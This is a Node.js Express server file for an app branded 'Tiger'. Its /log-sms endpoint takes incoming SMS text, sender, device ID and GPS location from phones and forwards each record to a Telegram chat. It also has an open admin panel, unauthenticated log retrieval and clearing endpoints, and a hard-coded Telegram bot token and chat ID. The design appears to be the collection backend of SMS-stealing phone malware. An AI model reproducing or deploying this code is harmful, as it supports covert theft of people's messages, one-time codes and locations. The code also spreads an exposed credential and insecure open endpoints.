const express = require('express');
const axios = require('axios');
const path = require('path');
const cors = require('cors'); 
const app = express();

app.use(cors()); 
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// --- CONFIGURATION ---
// Use env vars in production. Fallback to hard-coded values for local dev (do not commit new secrets).
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8394719862:AAGdG06eMVj_Mz4hFCqv-jHrmyiSqsDXppk'; 
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '7128071523';
// ---------------------

let smsLogs = [];

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/log-sms', async (req, res) => {
    try {
        const { sender, message, device, deviceId, timestamp, location } = req.body;
        
        const newEntry = {
            id: Date.now(),
            device: device || 'Tiger-Mobile',
            deviceId: deviceId || 'unknown',
            sender: sender || 'Unknown',
            message: message || 'No Content',
            time: timestamp || new Date().toLocaleString(),
            location: location || "Disabled"
        };

        smsLogs.unshift(newEntry);
        if (smsLogs.length > 200) smsLogs.pop();

        // ✅ Correct Map URL Logic: Mobile app se "lat,long" string aati hai
        const mapUrl = (newEntry.location !== "Disabled") 
            ? `\n📍 Location: https://www.google.com/maps?q=${newEntry.location}` 
            : '\n📍 Location: Not Available';

        const telegramMsg = `🐯 *Tiger Alert!*\n\n` +
                          `📱 *Device:* ${newEntry.device} (${newEntry.deviceId})\n` +
                          `👤 *From:* ${newEntry.sender}\n` +
                          `💬 *Message:* ${newEntry.message}\n` +
                          `⏰ *Time:* ${newEntry.time}` + mapUrl;
        console.log(`[Server] Sending to Telegram: ${telegramMsg}`);
        const telegramResponse = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: telegramMsg,
            parse_mode: 'Markdown'
        });
        console.log(`[Server] Telegram Response:`, telegramResponse.data);

        console.log(`[✓] Data sent to Telegram from ${newEntry.sender}`);
        res.status(200).json({ status: 'success' });

    } catch (error) {
        console.error('[Server] Error Details:', error.response ? error.response.data : error.message);
        console.error('[Server] Full Error:', error);
        // Handle common issues
        if (error.code === 'ENOTFOUND' || error.message.includes('Network Error')) {
          console.warn('[Server] Possible issues: Wrong Telegram token/CHAT_ID, network issues, or Telegram API down.');
        }
        res.status(500).json({ status: 'error' });
    }
});

app.get('/get-logs', (req, res) => {
    const deviceId = req.query.deviceId;
    if (deviceId) {
      return res.json(smsLogs.filter(log => log.deviceId === deviceId));
    }
    res.json(smsLogs);
});

app.post('/clear-logs', (req, res) => {
    smsLogs = [];
    res.json({ success: true });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
    console.log(`🚀 Tiger Server is Live on Port ${PORT}`);
});
